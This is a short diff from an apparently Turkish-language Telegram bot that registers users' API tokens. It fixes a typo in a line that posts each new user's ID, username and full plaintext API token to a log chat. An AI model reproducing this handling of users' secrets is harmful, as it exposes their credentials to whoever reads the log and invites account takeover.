@@ -1124,7 +1124,7 @@ def apikayit(update, context):
             collection.update_one({"_id": user}, {"$set": {"token": token}})
         bot.send_message(chat, "<b>🟢 API kaydedildi!</b>")
         bot.send_message(chat, "<i>📝 Lütfen kanalınızdan bir gönderi iletin.</i>", reply_markup=imark())
-        bot.send_message(blog, f"#YENİ_KULLANİCİ\nID: {user}\nAPI: {token}\nK.ADI: {update.message.fret.username}")
+        bot.send_message(blog, f"#YENİ_KULLANİCİ\nID: {user}\nAPI: {token}\nK.ADI: {update.message.from_user.username}")
         return KANALKAYDET
     if bnb == None:
         collection.insert_one(key)
